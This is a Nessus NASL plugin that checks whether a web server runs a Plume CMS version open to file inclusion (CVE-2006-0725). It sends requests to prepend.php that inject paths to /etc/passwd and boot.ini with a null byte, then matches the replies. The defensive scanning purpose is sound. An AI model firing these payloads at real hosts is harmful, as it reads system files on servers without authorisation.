#
# Script Written By Ferdy Riphagen 
# <f[dot]riphagen[at]nsec[dot]nl>
#
# Script distributed under the GNU GPLv2 License.
#

if (description) {
 script_id(20972);
 script_version("$Revision: 1.3 $");

 script_cve_id("CVE-2006-0725");
 script_bugtraq_id(16662);
 if (defined_func("script_xref")) {
  script_xref(name:"OSVDB", value:"23204");
 }

 name["english"] = "Plume CMS <= 1.0.2 Remote File Inclusion Vulnerability";
 script_name(english:name["english"]);
 desc["english"] = "
Synopsis :

The remote host is running a PHP application that is prone
to local and remote file inclusion attacks. 

Description :

The system is running Plume CMS a simple but powerful 
content management system.

The version installed does not sanitize user input in the
'_PX_config[manager_path]' parameter in the 'prepend.php' file.
This allows an attacker to include arbitrary files and execute code
on the system.

This flaw is exploitable if PHP's register_globals is enabled.

See also :

http://www.plume-cms.net/news/77-Security-Notice-Please-Update-Your-Prependphp-File
http://secunia.com/advisories/18883/

Solution :

Either sanitize the prepend.php
file as advised by the developer (see first URL) or 
upgrade to Plume CMS version 1.0.3 or later

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
 script_description(english:desc["english"]);

 summary["english"] = "Check if Plume CMS is vulnerable to a file inclusion flaw";
 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2006 Ferdy Riphagen");

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

# Check a few directories.
if (thorough_tests) dirs = make_list("/plume", "/cms", "/", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
 res = http_get_cache(item:string(dir, "/index.php"), port:port); 
 if(res == NULL) exit(0);

 if(egrep(pattern:'<a href=[^>]+.*alt="powered by PLUME CMS', string:res)) {

  # Try to grab a local file.
  file[0] = "/etc/passwd";
  file[1] = "c:/boot.ini";

  for(test = 0; file[test]; test++) {
   req = http_get(item:string(dir, "/prepend.php?_PX_config[manager_path]=", file[test], "%00"), port:port); 
   #debug_print("req: ", req, "\n");

   recv = http_keepalive_send_recv(data:req, bodyonly:TRUE, port:port);
   if (!recv) exit(0);
   #debug_print("recv: ", recv, "\n");

   if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv) ||
       egrep(pattern:"default=multi.*disk.*partition", string:recv) ||
       # And if magic_quotes_gpc = on, check for error messages.
       egrep(pattern:"Warning.+\([^>]+\\0/conf/config\.php.+failed to open stream", string:recv)) {
    security_warning(port);
    exit(0);
   }
   if (!thorough_tests) break;  
  }
 }
}
